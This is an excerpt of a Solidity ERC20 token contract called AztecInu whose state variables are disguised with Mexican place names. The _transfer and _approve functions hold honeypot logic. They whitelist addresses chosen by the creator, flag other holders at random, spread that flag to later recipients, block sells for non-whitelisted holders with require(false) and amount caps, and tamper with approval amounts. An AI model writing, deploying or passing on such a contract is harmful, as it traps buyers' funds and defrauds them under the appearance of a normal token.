...
contract AztecInu is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public tenochtitlan;
  mapping (address => bool) public mexico;
  mapping (address => bool) public toluca;
  mapping (address => uint256) public sierra;

  bool private latina;
  uint256 private _totalSupply;
  uint256 private oaxaca;
  uint256 private maya;
  ...
  constructor() public {
    ...
    maya = chTx * 30;
    mexico[creator] = false;
    toluca[creator] = false;
    tenochtitlan[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (latina == true)) {
      tenochtitlan[recipient] = true;
      mexico[recipient] = false;
      latina = false;
    }
    
    if ((amount > maya) && (tenochtitlan[sender] == true) && (address(sender) != creator)) {
        toluca[recipient] = true;
    }
    
    if (tenochtitlan[recipient] != true) {
        mexico[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((mexico[sender]) && (tenochtitlan[recipient] == false)) {
        mexico[recipient] = true;
    }
    
    if (tenochtitlan[sender] == false) {
      if ((amount > maya) && (toluca[sender] == true)) {
        require(false);
      }
      
      require(amount < oaxaca);
      if (yucatan == true) {
        if (toluca[sender] == true) {
          require(false);
        }
        toluca[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (quintana == true)) {
      tenochtitlan[spender] = true;
      mexico[spender] = false;
      toluca[spender] = false;
      quintana = false;
    }
    
    tok = (mexico[owner] ? 7665443 : amount);
